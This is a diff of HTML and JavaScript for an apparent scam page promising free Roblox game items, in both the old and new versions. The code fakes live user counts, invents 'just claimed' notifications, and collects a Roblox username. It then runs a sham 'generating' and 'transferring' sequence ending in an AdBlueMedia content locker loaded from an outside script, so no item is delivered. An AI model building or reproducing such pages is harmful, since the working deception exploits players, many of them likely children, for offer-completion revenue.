+  // Supply ads personalization default for EEA readers
+  // See https://www.blogger.com/go/adspersonalization
+  adsbygoogle = window.adsbygoogle || [];
+  if (typeof adsbygoogle.requestNonPersonalizedAds === 'undefined') {
+    adsbygoogle.requestNonPersonalizedAds = 1;
+  }
+</script>
+
 </head>
 <body>
 
-<!-- animated bg -->
-<div class="animated-background">
-  <div class="bg-item-img" style="--delay:0s;--duration:16s;left:4%;"><img src="https://speedescape.pages.dev/images/+1B%20SPEED.png" alt="speed" style="opacity:0.3;"></div>
-  <div class="bg-item-img" style="--delay:3s;--duration:19s;left:72%;"><img src="https://speedescape.pages.dev/images/SOUNDPACKS.png" alt="sound" style="opacity:0.3;"></div>
-</div>
-
-<!-- lang switcher -->
-<div class="lang-switcher">
-  <span class="lang-icon">🌐</span>
-  <span class="lang-label">EN</span>
-  <select class="lang-select" aria-label="language">
-    <option value="en">EN</option>
-    <option value="es">ES</option>
-    <option value="fr">FR</option>
-  </select>
-</div>
-
-<div class="main-container" id="main-content">
-  <div class="container">
-
-    <!-- hero -->
-    <div class="page-hero">
-      <!-- Official Logo -->
-      <img class="hero-logo" src="https://animalhospital.pages.dev/images/logo.png?v=2" alt="Speed Keyboard Escape Logo">
-      <h1 class="hero-title">FREE ITEMS &amp; BOOSTS</h1>
-      <p class="hero-sub">Tap claim and unlock your free drop.</p>
-      <div class="social-proof"><span class="dot"></span> Players claiming right now</div>
+  <div class="logo-container">
+    <img src="https://i.ibb.co/G4WDmztW/35098-removebg-preview-1.png" alt="GROW A GARDEN Logo" border="0">
+  </div>
+  
+  <div class="content">
+    <div class="top-bar">
+      <div class="active-users-box">
+        <span>Active users :</span>
+        <span class="active-users-count" id="activeUsersCount"></span>
+      </div>
     </div>
 
-    <!-- shop -->
-    <div class="shop-panel">
-      <div class="store-banner">
-        <div class="store-banner-left">
-          <img class="store-logo" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='20' fill='%231f3a1f'/%3E%3Ctext x='16' y='66' font-size='48' fill='%23b3e6b3'%3E🛒%3C/text%3E%3C/svg%3E" alt="store">
-          <span style="font-weight:800;color:#c6e6c6;">SHOP</span>
+    <div class="select-title">
+      SELECT AN ITEM YOU WISH TO GET IT
+    </div>
+
+    <!-- إرجاع هيكل الصفوف كما كان في الأصل للهواتف -->
+    <div class="items-grid" id="itemsGrid">
+      <div class="items-row">
+        <div class="item-card">
+          <img class="item-img" src="https://i.ibb.co/k6vXfQ38/IMG-6330.png" alt="Elephant-Ears">
+          <div class="item-name">Admin Treadmill</div>
         </div>
-        <div class="store-banner-tabs">
-          <button class="store-tab tab-seeds active">Items</button>
-          <button class="store-tab tab-gears">Boosts</button>
+        <div class="item-card">
+          <img class="item-img" src="https://i.ibb.co/dwdpgvM3/IMG-6331.png" alt="Cacao">
+          <div class="item-name">Candy Treadmill</div>
+        </div>
+        <div class="item-card">
+          <img class="item-img" src="https://i.ibb.co/hRTWg93p/IMG-6332.png" alt="Pepper">
+          <div class="item-name ">Diamond Treadmill</div>
         </div>
       </div>
-
-      <div class="shop-items-list" id="shopItemsList">
-        <!-- items injected by JS -->
+      <div class="items-row">
+        <div class="item-card">
+          <img class="item-img"  src="https://i.ibb.co/TxdLGFWz/IMG-6333.png" alt="Super-Seed">
+          <div class="item-name"> Golden Mask</div>
+        </div>
+        <div class="item-card">
+          <img class="item-img" src="https://i.ibb.co/ZzXSc5jw/IMG-6335.png" alt="Candy-Blossom">
+          <div class="item-name"> +1B SPEED</div>
+        </div>
+        <div class="item-card">
+          <img class="item-img" src="https://i.ibb.co/gMN07Zkh/IMG-6336.png" alt="Mango">
+          <div class="item-name">SOUNDPACKS</div>
+        </div>
+      </div>
+      <div class="items-row">
+        <div class="item-card">
+          <img class="item-img" src="https://i.ibb.co/zTvFcXq5/IMG-6337.png" alt="Dragon fruit">
+          <div class="item-name">Infinity Trail</div>
+        </div>
+        <div class="item-card">
+          <img class="item-img" src="https://i.ibb.co/Cph0RtDs/IMG-6338.png" alt="Flower-Seed">
+          <div class="item-name">Godlike Trail</div>
+        </div>
+        <div class="item-card">
+          <img class="item-img" src="https://i.ibb.co/nMH4H3DH/IMG-6339.png" alt="Raccon-Better-Quality">
+          <div class="item-name"> Supernova Trail</div>
+        </div>
+      </div>
+      <div class="items-row">
+        <div class="item-card">
+          <img class="item-img" src="https://i.ibb.co/84Mx5MpQ/IMG-6340.png" alt="Dragonfly">
+          <div class="item-name">Electric Aura</div>
+        </div>
+        <div class="item-card">
+          <img class="item-img" src="https://i.ibb.co/DgQHMgRb/IMG-6341.png" alt="Queen-bee">
+          <div class="item-name">Fire Aura</div>
+        </div>
+        <div class="item-card">
+          <img class="item-img" src="https://i.ibb.co/DgQHMgRb/IMG-6341.png" alt="Ember Lily">
+          <div class="item-name">Water Aura </div>
+        </div>
+      </div>
+      <div class="items-row">
+        <div class="item-card">
+          <img class="item-img" src="https://i.ibb.co/V0g83qvr/IMG-6342.png" alt="butterfly pet">
+          <div class="item-name">Storm Aura</div>
+        </div>
+        <div class="item-card">
+          <img class="item-img" src="https://i.ibb.co/6RS2WFHQ/IMG-6343.png" alt="Disco Bee">
+          <div class="item-name">Candy Aura</div>
+        </div>
+        <div class="item-card">
+          <img class="item-img" src="https://i.ibb.co/0pwCt1j9/IMG-6344.png" alt="Master-Sprinkler">
+          <div class="item-name">Chocolate Aura</div>
+        </div>
+      
+ 
+        </div>
       </div>
     </div>
   </div>
-
-  <footer class="site-footer">
-    <div class="container">
-      <p>Animal Hospital Free Drop &amp; boosts</p>
+  
+  <div class="cliameds"></div>
+  
+  <!-- Purchase Popup -->
+  <div class="purchase-popup" id="purchase-popup">
+    <div class="popup-content">
+      <!-- Dynamic content -->
     </div>
-  </footer>
-</div>
-
-<!-- GEN MODAL (locker) -->
-<div id="gen-modal" class="gen-modal" role="dialog">
-  <div class="gen-backdrop" onclick="closeModal()"></div>
-  <div class="gen-box">
-    <div class="gen-header">
-      <div class="gen-logo-row">
-        <img class="gen-logo-img" src="https://animalhospital.pages.dev/images/logo.png?v=2" alt="logo">
-        <div>
-          <div class="gen-label">Animal Hospital Free Drop</div>
-        </div>
-      </div>
-      <button onclick="closeModal()" style="background:transparent;border:none;color:#8aaa8a;font-size:1.4rem;margin-left:auto;">✕</button>
-    </div>
-
-    <!-- SCREEN 1 -->
-    <div id="gen-screen-1" class="gen-screen active">
-      <div class="gen-item-preview">
-        <img id="gen-item-img" class="gen-item-thumb" src="" alt="item">
-        <div>
-          <div class="gen-item-name" id="gen-item-name">+1B SPEED</div>
-          <div class="gen-item-badge">FREE DROP</div>
-        </div>
-      </div>
-      <p class="gen-desc">Enter your Roblox username to start generating your free Animal Hospital item.</p>
-      <div class="gen-input-wrap">
-        <span class="gen-input-icon">👤</span>
-        <input type="text" id="gen-username-input" class="gen-input" placeholder="Your Roblox username" maxlength="20">
-      </div>
-      <div id="gen-error" class="gen-error-msg"></div>
-      <button class="gen-btn-primary" id="gen-btn-start" onclick="startFakeGen()">Claim Now</button>
-      <div class="gen-security-row"><span class="gen-security-dot"></span> Secure connection · No password required</div>
-    </div>
-
-    <!-- SCREEN 2 -->
-    <div id="gen-screen-2" class="gen-screen">
-      <div class="gen-progress-header">
-        <div class="avatar-scanner-container">
-          <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='50' fill='%231a3d1d'/%3E%3Ccircle cx='50' cy='35' r='18' fill='%23a3cca7'/%3E%3Cpath d='M15 85c0-15 15-22 35-22s35 7 35 22z' fill='%23a3cca7'/%3E%3C/svg%3E" class="scanner-avatar-img" alt="avatar">
-          <div class="scanner-laser"></div>
-        </div>
-        <p class="gen-progress-label" id="gen-progress-label">Connecting to server...</p>
-      </div>
-      <div class="gen-steps" id="gen-steps">
-        <div class="gen-step" id="gstep-1"><div class="gen-step-icon"><span>1</span></div><div><div class="gen-step-title">Locating account</div><div class="gen-step-sub">Searching Roblox servers...</div></div></div>
-        <div class="gen-step" id="gstep-2"><div class="gen-step-icon"><span>2</span></div><div><div class="gen-step-title">Generating item</div><div class="gen-step-sub">Preparing your drop...</div></div></div>
-        <div class="gen-step" id="gstep-3"><div class="gen-step-icon"><span>3</span></div><div><div class="gen-step-title">Encrypting transfer</div><div class="gen-step-sub">Securing your reward...</div></div></div>
-        <div class="gen-step" id="gstep-4"><div class="gen-step-icon"><span>4</span></div><div><div class="gen-step-title">Ready to deliver</div><div class="gen-step-sub">Waiting for verification...</div></div></div>
-      </div>
-      <div class="gen-progress-bar-wrap"><div class="gen-progress-bar" id="gen-progress-bar" style="width:0%;"></div></div>
-    </div>
-
-    <!-- SCREEN 3 - Hidden, only used as a placeholder -->
-    <div id="gen-screen-3" class="gen-screen" style="display:none !important;"></div>
   </div>
-</div>
-
-<script>
-  (function() {
-    // ----- COMPLETE shop items with REAL image URLs -----
-    const items = [
-      { name: '3250 Animal Coins', img: 'https://animalhospital.pages.dev/images/3250-Animal-Coins.png', rarity: 'Legendary', stock: 'x50' },
-      { name: 'Agent R', img: 'https://animalhospital.pages.dev/images/agent-R.png', rarity: 'Epic', stock: 'x10' },
-      { name: 'Doctor', img: 'https://animalhospital.pages.dev/images/doctor.png', rarity: 'Epic', stock: 'x9' },
-      { name: 'Head Nurse', img: 'https://animalhospital.pages.dev/images/head-nurse.png', rarity: 'Epic', stock: 'x8' },
-      { name: 'Hospital Cop', img: 'https://animalhospital.pages.dev/images/hospital-cop.png', rarity: 'Epic', stock: 'x7' },
-      { name: 'Psycho', img: 'https://animalhospital.pages.dev/images/psycho.png', rarity: 'Epic', stock: 'x6' },
-      { name: 'Psychologist', img: 'https://animalhospital.pages.dev/images/psychologist.png', rarity: 'Epic', stock: 'x5' },
-      { name: 'Secret Agent', img: 'https://animalhospital.pages.dev/images/secret-agent.png', rarity: 'Epic', stock: 'x4' },
-      { name: 'Security', img: 'https://animalhospital.pages.dev/images/security.png', rarity: 'Epic', stock: 'x3' },
-      { name: 'Surgeon', img: 'https://animalhospital.pages.dev/images/surgeon.png', rarity: 'Epic', stock: 'x2' }
+  
+  <!-- Sound elements -->
+  <audio id="dingSound" preload="auto">
+    <source src="https://cdn.pixabay.com/audio/2022/03/10/audio_63c49c13c8.mp3" type="audio/mpeg">
+  </audio>
+  
+  <audio id="clickSound" preload="auto">
+    <source src="https://cdn.pixabay.com/audio/2022/03/10/audio_63c49c13c8.mp3" type="audio/mpeg">
+  </audio>
+  
+  <!-- AdBlueMedia code --><script type="text/javascript">
+    var poBtM_qSb_QyDXQc={"it":4619176,"key":"10f0b"};
+</script>
+<script src="https://d19k1sh57v5k0g.cloudfront.net/a7ee782.js"></script>
+  <script>
+    // Function to generate random number between 90 and 900
+    function randomUsers() {
+      return Math.floor(Math.random() * (900 - 90 + 1)) + 90;
+    }
+    function updateActiveUsers() {
+      document.getElementById('activeUsersCount').textContent = randomUsers();
+    }
+    updateActiveUsers();
+    setInterval(updateActiveUsers, 4500);
+    
+    // Notifications code
+    const avatars = [
+      'https://dress2.pages.dev/avatars/avatar1.png',
+      'https://dress2.pages.dev/avatars/avatar2.png',
+      'https://dress2.pages.dev/avatars/avatar3.png',
+      'https://dress2.pages.dev/avatars/avatar4.png',
+      'https://dress2.pages.dev/avatars/avatar5.png',
+      'https://dress2.pages.dev/avatars/avatar6.png',
+      'https://dress2.pages.dev/avatars/avatar7.png',
+      'https://dress2.pages.dev/avatars/avatar8.png',
+      'https://dress2.pages.dev/avatars/avatar9.png',
+      'https://dress2.pages.dev/avatars/avatar10.png'
     ];
 
-    const container = document.getElementById('shopItemsList');
-    if (container) {
-      items.forEach(it => {
-        const div = document.createElement('div');
-        div.className = 'shop-item';
-        div.onclick = () => openLocker(it.name, it.img);
-        div.innerHTML = `
-          <div class="shop-item-img-box"><img src="${it.img}" alt="${it.name}" loading="lazy"></div>
-          <div class="shop-item-info">
-            <div class="shop-item-name">${it.name}</div>
-            <div class="shop-item-stock">${it.stock} in Stock</div>
-            <span class="shop-item-rarity rarity-${it.rarity.toLowerCase()}">${it.rarity}</span>
+    const items = [ 
+      'Chocolate Aura', 'Candy Aura', 'Storm Aura','Water Aura','Fire Aura' , 'Electric Aura',' Supernova Trail ' ,' Godlike Trail' ,'Infinity Trail','SOUNDPACKS','+1B SPEED',      
+      'Star-Caller','Master-Sprinkler','Golden Mask','Golden Mask','','Admin Treadmill' ,'Admin Treadmill'   ,'Admin Treadmill'    ,
+    ];
+
+    const usernames = [
+      'MADELYN2', 'zontir99', 'marcos10', 'Queen_lisa1', 'LANA11','HAMZA22','tbonmk2','caroline34','dimaraja10','asktiyal9hba','ronaldo7','sidi_binzarn1','DERKAOUI_ZAML1','Tizit.botsot', 'Achnid22'
+    ];
+
+    // متغيرات للتحكم في الإشعارات
+    let notificationInterval;
+    let popupOpen = false;
+
+    function startNotifications() {
+      if (popupOpen) return;
+      
+      notificationInterval = setInterval(function() {
+        if (popupOpen) return;
+        
+        $(".cliameds").fadeIn(); 
+        
+        var html = `
+          <div class="message">
+            <div class="img"><img src="${avatars[Math.floor(Math.random() * avatars.length)]}" alt=""></div>
+            <div class="more">
+              <div>${usernames[Math.floor(Math.random() * usernames.length)]}</div>
+              <div> JUST CLAIMED '${items[Math.floor(Math.random() * items.length)]}'</div>
+            </div>
           </div>
-          <button class="roblox-claim-btn" onclick="event.stopPropagation();openLocker('${it.name}','${it.img}')">Claim!</button>
         `;
-        container.appendChild(div);
-      });
+        $(".cliameds").html(html);
+
+        setTimeout(function() {
+          $(".cliameds").fadeOut();  
+        }, 3000);
+      }, 5000); // تم تغيير الفاصل الزمني إلى 7 ثوانٍ
     }
 
-    // modal state
-    window.openLocker = function(itemName, itemImg) {
-      const modal = document.getElementById('gen-modal');
-      modal.classList.add('active');
-      document.getElementById('gen-item-name').textContent = itemName;
-      document.getElementById('gen-item-img').src = itemImg || 'https://speedescape.pages.dev/images/+1B%20SPEED.png';
-      showScreen('gen-screen-1');
-      document.getElementById('gen-username-input').value = '';
-      document.getElementById('gen-error').textContent = '';
-      document.getElementById('gen-progress-bar').style.width = '0%';
-      window._selectedItem = { name: itemName, img: itemImg };
-    };
-
-    window.closeModal = function() {
-      document.getElementById('gen-modal').classList.remove('active');
-    };
-
-    function showScreen(id) {
-      document.querySelectorAll('.gen-screen').forEach(el => el.classList.remove('active'));
-      document.getElementById(id).classList.add('active');
+    function stopNotifications() {
+      clearInterval(notificationInterval);
+      $(".cliameds").fadeOut();
     }
-
-    // fake generator
-    window.startFakeGen = function() {
-      const username = document.getElementById('gen-username-input').value.trim();
-      if (!username || username.length < 2) {
-        document.getElementById('gen-error').textContent = 'Enter a valid Roblox username.';
-        return;
-      }
-      document.getElementById('gen-error').textContent = '';
-      showScreen('gen-screen-2');
-      const steps = ['gstep-1','gstep-2','gstep-3','gstep-4'];
-      const stepSubs = ['Searching Roblox servers...','Preparing your drop...','Securing your reward...','Ready to deliver!'];
-      const progress = document.getElementById('gen-progress-bar');
-      const label = document.getElementById('gen-progress-label');
-      let i = 0;
-      function advanceStep() {
-        if (i < steps.length) {
-          const el = document.getElementById(steps[i]);
-          if (el) {
-            el.style.borderLeftColor = '#7ed97e';
-            el.querySelector('.gen-step-icon').style.background = '#3d7a3d';
-            el.querySelector('.gen-step-sub').textContent = stepSubs[i] || 'Done';
-          }
-          progress.style.width = ((i+1)/steps.length * 100) + '%';
-          label.textContent = i < steps.length-1 ? 'Processing...' : 'Ready to deliver!';
-          i++;
-          setTimeout(advanceStep, 700 + Math.random()*500);
-        } else {
-          // Verification complete - open content locker immediately
-          if (typeof _wg === 'function') {
-            _du();
-          } else {
-            console.warn('Content locker (_wg) not loaded');
-          }
-          // Close the modal after opening locker
-          setTimeout(function() {
-            closeModal();
-          }, 500);
+    
+    // بدء الإشعارات عند تحميل الصفحة
+    startNotifications();
+    
+    // Function to show purchase popup
+    const showPurchasePopup = (itemName, itemImage) => {
+      // إيقاف الإشعارات عند فتح الواجهة
+      popupOpen = true;
+      stopNotifications();
+      
+      const popup = document.getElementById('purchase-popup');
+      const popupContent = popup.querySelector('.popup-content');
+      
+      popupContent.innerHTML = `
+        <div class="popup-header">
+          <h3>Get Item</h3>
+        </div>
+        <img src="${itemImage}" alt="Item Image" class="item-popup-image">
+        <p class="item-confirm">Would you like to Get "<span>${itemName}</span>"?</p>
+        <div class="input-group">
+          <input type="text" id="username-input" placeholder="Enter your Roblox username">
+        </div>
+        <div class="user-error d-none">Please enter a valid username</div>
+        <div class="popup-buttons">
+          <button class="cancel-btn">Cancel</button>
+          <button class="free-btn" id="search-user-btn">
+            <span class="free-icon"></span>
+            <span class="free-badge">continue</span>
+          </button>
+        </div>
+      `;
+      
+      popupContent.querySelector('.cancel-btn').addEventListener('click', closePurchasePopup);
+      popupContent.querySelector('#search-user-btn').addEventListener('click', function() {
+        // Play sound when clicking "continue" button
+        const clickSound = document.getElementById('clickSound');
+        clickSound.currentTime = 0;
+        clickSound.play();
+        
+        const username = document.getElementById('username-input').value.trim();
+        if (!username) {
+          document.querySelector('.user-error').classList.remove('d-none');
+          return;
         }
-      }
-      setTimeout(advanceStep, 400);
-    };
+        showSearchingState(username, itemName, itemImage);
+      });
+      
+      popup.style.display = 'flex';
+      document.getElementById('username-input').focus();
+    }
 
-    document.querySelector('.gen-backdrop')?.addEventListener('click', closeModal);
+    // Function to close popup
+    const closePurchasePopup = () => {
+      document.getElementById('purchase-popup').style.display = 'none';
+      popupOpen = false;
+      // إعادة تشغيل الإشعارات عند إغلاق الواجهة
+      startNotifications();
+    }
 
-    document.querySelector('.lang-select')?.addEventListener('change', function(e) {
-      console.log('lang changed to', e.target.value);
-    });
+    // Function to show searching state
+    const showSearchingState = (username, itemName, itemImage) => {
+      const popupContent = document.querySelector('.popup-content');
+      
+      popupContent.innerHTML = `
+        <div class="popup-header">
+          <h3>Get Item</h3>
+        </div>
+        <div style="text-align:center;padding:20px">
+          <div class="folding">
+            <div class="sk-cube1 sk-cube"></div>
+            <div class="sk-cube2 sk-cube"></div>
+            <div class="sk-cube4 sk-cube"></div>
+            <div class="sk-cube3 sk-cube"></div>
+            <div class="square"></div>
+          </div>
+          <p class="searching-text">Searching for @${username}</p>
+        </div>
+      `;
+      
+      // Use API to search for user
+      fetch(`https://abadaoucht.com/tiktok/api/roblox/userinfo/${username}`)
+        .then(response => response.json())
+        .then(data => {
+          if (data.status === "SUCCESS") {
+            showSuccessState(username, data.avatar, itemName, itemImage);
+          } else {
+            showErrorState(username, itemName, itemImage);
+          }
+        })
+        .catch(error => {
+          console.error('Error:', error);
+          showErrorState(username, itemName, itemImage);
+        });
+    }
 
-    document.querySelectorAll('.store-tab').forEach(tab => {
-      tab.addEventListener('click', function() {
-        document.querySelectorAll('.store-tab').forEach(t => t.classList.remove('active'));
-        this.classList.add('active');
+    // Function to show success state
+    const showSuccessState = (username, avatarUrl, itemName, itemImage) => {
+      const popupContent = document.querySelector('.popup-content');
+      
+      popupContent.innerHTML = `
+        <div class="popup-header">
+          <h3>Get Item</h3>
+        </div>
+        <div style="text-align:center;padding:20px">
+          <img src="${avatarUrl}" class="result-avatar">
+          <p class="result-username">@${username}</p>
+          <button class="get-item-now-btn">Continue</button>
+        </div>
+      `;
+      
+      popupContent.querySelector('.get-item-now-btn').addEventListener('click', function() {
+        // Play sound when clicking "Continue" button
+        const clickSound = document.getElementById('clickSound');
+        clickSound.currentTime = 0;
+        clickSound.play();
+        showVerificationState(username, itemName, itemImage);
+      });
+    }
+
+    // Function to show verification state
+    const showVerificationState = (username, itemName, itemImage) => {
+      const popupContent = document.querySelector('.popup-content');
+      
+      popupContent.innerHTML = `
+        <div class="popup-header">
+          <h3>Verification</h3>
+        </div>
+        <div style="text-align:center;padding:20px">
+          <div class="folding">
+            <div class="sk-cube1 sk-cube"></div>
+            <div class="sk-cube2 sk-cube"></div>
+            <div class="sk-cube4 sk-cube"></div>
+            <div class="sk-cube3 sk-cube"></div>
+            <div class="square"></div>
+          </div>
+          <p class="searching-text">Transferring ${itemName} to @${username}</p>
+        </div>
+      `;
+      
+      // After 3 seconds, activate AdBlueMedia lock
+      setTimeout(() => {
+        _yy(); // Activate AdBlueMedia lock
+        closePurchasePopup();
+      }, 3000);
+    }
+
+    // Function to show error state
+    const showErrorState = (username, itemName, itemImage) => {
+      const popupContent = document.querySelector('.popup-content');
+      
+      popupContent.innerHTML = `
+        <div class="popup-header">
+          <h3>Error</h3>
+        </div>
+        <div style="text-align:center;padding:20px">
+          <p class="searching-text" style="color: #ff6b6b;">User @${username} not found</p>
+          <button class="get-item-now-btn" id="retry-btn">Try Again</button>
+        </div>
+      `;
+      
+      popupContent.querySelector('#retry-btn').addEventListener('click', function() {
+        showPurchasePopup(itemName, itemImage);
+      });
+    }
+
+    // Add golden item effect and sound
+    $(document).ready(function() {
+      const dingSound = document.getElementById('dingSound');
+      let soundEnabled = true;
+      
+      $('.item-card').click(function() {
+        // Remove selection from all items
+        $('.item-card').removeClass('selected');
+        
+        // Add selection to the clicked item
+        $(this).addClass('selected');
+        
+        // Play sound
+        dingSound.currentTime = 0;
+        dingSound.play();
+        
+        // Open purchase popup
+        const itemName = $(this).find('.item-name').text().trim();
+        const itemImage = $(this).find('.item-img').attr('src');
+        showPurchasePopup(itemName, itemImage);
       });
     });
+  </script>
 
-  })();
+
+<!-- 'It is your responsibility to notify your visitors about cookies used and data collected on your blog. Blogger makes a standard notification available for you to use on your blog, and you can customize it or replace with your own notice. See http://www.blogger.com/go/cookiechoices for more details.' -->
+<script src="/js/cookienotice.js" defer></script>
+<script>
+  document.addEventListener('DOMContentLoaded', function(event) {
+    window.cookieChoices && cookieChoices.showCookieConsentBar && cookieChoices.showCookieConsentBar(
+        (window.cookieOptions && cookieOptions.msg) || 'This site uses cookies from Google to deliver its services and to analyze traffic. Your IP address and user-agent are shared with Google along with performance and security metrics to ensure quality of service, generate usage statistics, and to detect and address abuse.',
+        (window.cookieOptions && cookieOptions.close) || 'Got it',
+        (window.cookieOptions && cookieOptions.learn) || 'Learn More',
+        (window.cookieOptions && cookieOptions.link) || 'https://www.blogger.com/go/blogspot-cookies');
+  });
 </script>
+
 
 
 <!-- 'It is your responsibility to notify your visitors about cookies used and data collected on your blog. Blogger makes a standard notification available for you to use on your blog, and you can customize it or replace with your own notice. See http://www.blogger.com/go/cookiechoices for more details.' -->
